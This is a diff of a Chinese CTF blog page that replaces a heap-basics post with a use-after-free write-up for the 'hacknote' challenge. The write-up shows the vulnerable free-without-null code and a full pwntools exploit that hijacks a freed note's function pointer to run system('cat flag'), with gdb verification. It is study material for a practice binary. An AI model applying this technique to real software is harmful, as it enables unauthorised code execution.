@@ -16,25 +16,27 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="basic knowledge in heap exploitation">
+    <meta name="description" content="User After Free in Heap Exploitation">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Heap 基础知识">
-<meta property="og:url" content="https://isolator-1.github.io/2022/11/18/ctf-pwn/heap%20exploitation/index.html">
+<meta property="og:title" content="UAF">
+<meta property="og:url" content="https://isolator-1.github.io/2022/11/22/ctf-pwn/UAF/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="basic knowledge in heap exploitation">
+<meta property="og:description" content="User After Free in Heap Exploitation">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/heapexploitation/1.jpg">
-<meta property="og:image" content="https://isolator-1.github.io/img/heapexploitation/2.jpg">
-<meta property="article:published_time" content="2022-11-18T04:19:00.000Z">
-<meta property="article:modified_time" content="2023-10-24T02:57:08.081Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/UAF/1.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/UAF/2.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/UAF/3.jpg">
+<meta property="article:published_time" content="2022-11-22T12:37:00.000Z">
+<meta property="article:modified_time" content="2023-09-14T01:44:32.258Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="exp">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/heapexploitation/1.jpg">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/UAF/1.jpg">
   
   
   
-  <title>Heap 基础知识 - Isolator&#39;s Blog</title>
+  <title>UAF - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Heap 基础知识"></span>
+            <span id="subtitle" data-typed-text="UAF"></span>
           
         </div>
 
@@ -210,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-18 12:19" pubdate>
-          November 18, 2022 pm
+        <time datetime="2022-11-22 20:37" pubdate>
+          November 22, 2022 pm
         </time>
       </span>
     
@@ -222,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k words
+          2.1k words
         
       </span>
     
@@ -233,7 +235,7 @@
         
         
         
-          16 mins
+          18 mins
         
       </span>
     
@@ -271,53 +273,45 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Heap 基础知识</h1>
+            <h1 style="display: none">UAF</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure>
+                <h4 id="参考ctf-wiki"><a href="#参考ctf-wiki" class="headerlink" title="参考ctf-wiki"></a>参考ctf-wiki</h4><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>
+<p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p>
+<h4 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= count) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (notelist[idx]) &#123;<br>    <span class="hljs-built_in">free</span>(notelist[idx]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure>
 
-<p>size = 0时，返回系统允许的最小内存块</p>
-<p>32位系统下malloc(0)分配8Bytes，64位分配16Bytes</p>
-<h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>堆段的起点和终点标识符：start_brk、brk（program brk)</p>
-<p>不开ASLR，初始时都指向bss段末尾（end_data)</p>
-<p>开启ASLR，会随机向后偏移一段距离</p>
-<p><code>brk()</code>函数作用为抬高brk指针，获取一段heap</p>
-<p>程序开始时heap大小为0，第一次申请堆的时候，通过brk()向系统申请一段内存  <strong>main_arena</strong>，后面malloc都会从main_arena中申请内存</p>
-<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class="hljs-comment">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class="hljs-comment">/* Size in bytes，including overhead.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">fd</span>;</span>          <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk</span>;</span>          <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure>
+<p>程序中给了system：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
+<h4 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h4><p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
 
+<p>下面介绍这个exp的原理</p>
+<p>在delete 0和1之后fastbin结构如下图</p>
+<div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;第 1 页\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div>
+<script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script>
 
-<h4 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h4><p><code>prevsize </code>：如果前一个chunk是free的<em><strong>（这里指的是内存中的前一个，而不是freelist中的前一个）</strong></em>，它代表前一个chunk的大小；如果不是free的，存储前一个的user data 。32位中是4字节，64位中是8字节</p>
-<p><code>size</code>：此chunk大小。最低3位用来存储N（chunk 在 non_main_arena里为1）、M（chunk是mmap得到的为1）、P（前一个chunk已被分配为1 对应prevsize），因此size是8字节对齐的</p>
-<p><code>userdata</code>：数据</p>
-<p>（下一个chunk的prevsize也会存储userdata）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) ...   <span class="hljs-comment">//可以计算申请字节需要实际分配多少字节</span></span><br></code></pre></td></tr></table></figure>
+<p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p>
+<p>chunk C、D是<code>note[1]</code>的空间</p>
+<p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p>
+<p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p>
+<p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p>
+<p>理论是如此，下面用gdb验证一下</p>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br>menu = <span class="hljs-string">&#x27;Your choice :&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>dbg()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>dbg()<br>magic = <span class="hljs-number">0x08048986</span><br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>dbg()<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
-<p>chunk是在prevsize开始，但是malloc返回的指针指向userdata</p>
-<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p><code>prevsize</code>：上一个chunk的userdata，因为上一个如果也是free，则会被合并（fast bin中可能会例外，后面会提及）</p>
-<p><code>size</code>：同上</p>
-<p><code>fd bk</code>：（在freelist中的）前一个/后一个chunk</p>
-<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>位于arena顶部。在所有bin都没有满足需求的chunk时，从top chunk切割</p>
-<p>top chunk 不够，在main_arena中会用brk扩张top chunk，non_main_arena中，用mmap分配新的堆</p>
-<h3 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h3><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-17T04:09:19.532Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;ojfzveORWWdzC3RN6ooc\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;FyZdLwTWtfESSsWo7Yml\&quot; name=\&quot;第 1 页\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div>
-<script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>
-#### fast bin
+<p>在ida中可以看到notelist的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure>
 
-<p>在free一个chunk到fast bin时，它下一个chunk的P位（PREV_INUSE)是不会变的，还是为1，为了加快free的效率。<strong>因此地址连续的两个chunk 被free到fast bin，他们不会被合并</strong>。</p>
-<p>大小范围：0x10-0x40 （64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节</p>
-<p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶</p>
-<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>大于global_max_fast（fast bin最大大小）的chunk都会放进来</p>
-<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin</p>
-<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列</p>
-<h3 id="内存分配流程"><a href="#内存分配流程" class="headerlink" title="内存分配流程"></a>内存分配流程</h3><p> <img src="/img/heapexploitation/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<h3 id="内存释放流程"><a href="#内存释放流程" class="headerlink" title="内存释放流程"></a>内存释放流程</h3><p> <img src="/img/heapexploitation/2.jpg" srcset="/img/loading.gif" lazyload></p>
-<p><a target="_blank" rel="noopener" href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a></p>
-<p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></p>
-<p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc</a></p>
-<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc 内存管理 ptmalloc 源代码分析</a></p>
-<p><a target="_blank" rel="noopener" href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap</a></p>
+<p>查看三次notelist的内容，</p>
+<p><img src="/img/UAF/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/UAF/2.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/UAF/3.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p>
+<p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>
 
                 
               </div>
@@ -353,6 +347,8 @@
       
         <a href="/tags/ctf-pwn/">#ctf-pwn</a>
       
+        <a href="/tags/exp/">#exp</a>
+      
     </div>
   
 </div>
@@ -363,8 +359,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Heap 基础知识</div>
-      <div>https://isolator-1.github.io/2022/11/18/ctf-pwn/heap exploitation/</div>
+      <div>UAF</div>
+      <div>https://isolator-1.github.io/2022/11/22/ctf-pwn/UAF/</div>
     </div>
     <div class="license-meta">
       
@@ -376,7 +372,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>November 18, 2022</div>
+          <div>November 22, 2022</div>
         </div>
       
       
@@ -408,9 +404,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/22/ctf-pwn/%E5%A0%86%E5%88%A9%E7%94%A8%20UAF/" title="UAF">
+                      <a href="/2022/11/25/ctf-pwn/unlink/" title="unlink">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">UAF</span>
+                        <span class="hidden-mobile">unlink</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -418,8 +414,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/" title="ROP ciscn_2019_c_1">
-                        <span class="hidden-mobile">ROP ciscn_2019_c_1</span>
+                      <a href="/2022/11/18/ctf-pwn/heap%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="Heap 基础知识">
+                        <span class="hidden-mobile">Heap 基础知识</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
